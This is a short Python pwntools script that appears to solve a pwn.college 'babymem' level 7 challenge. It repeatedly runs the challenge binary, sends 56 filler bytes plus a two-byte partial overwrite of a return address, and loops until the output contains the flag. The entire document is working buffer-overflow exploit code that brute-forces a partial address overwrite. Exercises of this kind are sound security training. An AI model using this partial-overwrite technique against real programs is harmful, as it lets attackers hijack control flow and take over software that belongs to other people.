from pwn import *

while True:
    p = process('/challenge/babymem_level7.0')

    p.recvuntil('Payload size:')
    p.sendline(b'58')

    payload = b'a' * 56 + p16(0x4718) 

    #p.recvline('Send your payload')
    p.sendline(payload)

    #p.interactive()
    str = p.recvall(1)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break

